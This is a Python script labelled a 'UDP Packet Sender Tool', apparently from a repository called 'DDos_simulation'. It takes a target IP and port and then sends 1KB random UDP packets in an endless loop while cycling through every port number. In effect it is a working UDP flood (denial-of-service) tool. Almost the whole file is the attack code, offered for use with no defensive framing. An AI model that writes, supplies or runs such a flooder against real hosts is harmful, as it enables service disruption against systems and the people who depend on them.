import os
import sys
import time
import socket
import random
import argparse

def parse_arguments():
    parser = argparse.ArgumentParser(description="Simple UDP Packet Sender Tool")
    parser.add_argument("-i", "--ip", type=str, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, help="Target port number")
    return parser.parse_args()

def main():
    # Parse command-line flags
    args = parse_arguments()
    
    ip = args.ip
    port = args.port

    # Clear screen and show banner
    os.system("clear" if os.name == "posix" else "cls")
    print("--- UDP Packet Sender Tool ---")
    print("Author    : Shukurana Idris")
    print("github    : https://github.com/ShukuranaIdris/DDos_simulation.git")

    # If arguments weren't provided via terminal flags, prompt the user interactively
    try:
        if not ip:
            ip = input("IP Target : ")
        if not port:
            port = int(input("Port (e.g., 80) : "))
    except ValueError:
        print("[!] Invalid port number. Please enter an integer.")
        sys.exit(1)

    # Setup socket and payload bytes
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_payload = random._urandom(1024)  # 1KB random data packet

    # Loading animation
    os.system("clear" if os.name == "posix" else "cls")
    print("[                    ] 0% ")
    time.sleep(1)
    print("[=====               ] 25%")
    time.sleep(1)
    print("[==========          ] 50%")
    time.sleep(1)
    print("[===============     ] 75%")
    time.sleep(1)
    print("[====================] 100%")
    time.sleep(0.5)

    sent = 0
    print("\n[+] Starting packet transmission. Press Ctrl+C to stop.\n")
    
    try:
        while True:
            sock.sendto(bytes_payload, (ip, port))
            sent += 1
            print(f"Sent {sent} packet to {ip} through port {port}")
            
            port += 1
            if port > 65535:
                port = 1
                
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
